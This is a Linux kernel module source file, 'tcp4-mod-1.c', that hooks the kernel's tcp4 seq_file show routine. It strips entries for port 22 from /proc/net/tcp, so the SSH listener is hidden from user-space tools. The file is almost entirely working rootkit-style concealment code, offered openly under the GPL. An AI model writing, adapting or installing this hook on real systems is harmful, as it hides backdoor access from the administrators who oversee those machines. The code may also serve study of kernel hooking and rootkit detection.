/*
 * tcp4-mod-1.c
 *
 * This module hides the SSH port to the user space.
 *
 * Copyright (C) 2012 - David Goulet <dgoulet@ev0ke.net>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; only version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <asm/unistd.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>

/* from net/ipv4/tcp_ipv4.c */
#define TMPSZ 150

/* Hide SSH port */
#define PORT_TO_HIDE 22

int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;

char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack+strlen(needle) <= n)
		return s;
	else
		return NULL;
}

int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int retval = old_tcp4_seq_show(seq, v);

	char port[12];

	sprintf(port, "%04X", PORT_TO_HIDE);

	if (strnstr(seq->buf+seq->count-TMPSZ, port, TMPSZ)) {
		seq->count -= TMPSZ;
	}

	return retval;
}

static int myinit(void)
{
	struct tcp_seq_afinfo *my_afinfo = NULL;
	struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

    do {
        if (strncmp(my_dir_entry->name, "tcp", 3) == 0) {
            break;
        }
        my_dir_entry = my_dir_entry->next;
    } while (my_dir_entry != NULL);

	my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data;

	old_tcp4_seq_show = my_afinfo->seq_ops.show;
	my_afinfo->seq_ops.show = hook_tcp4_seq_show;

	printk("TCP4 mod: my_afinfo: %p\n", my_afinfo);
	printk("TCP4 mod: orig %p new addr %p\n", old_tcp4_seq_show,
			hook_tcp4_seq_show);

	return 0;
}

static void myexit(void)
{
	struct tcp_seq_afinfo *my_afinfo = NULL;
	struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

	do {
		if (strncmp(my_dir_entry->name, "tcp", 3) == 0) {
			break;
		}
		my_dir_entry = my_dir_entry->next;
	} while (my_dir_entry != NULL);

	my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data;
	my_afinfo->seq_ops.show = old_tcp4_seq_show;
}

module_init(myinit);
module_exit(myexit);


MODULE_LICENSE("GPL");
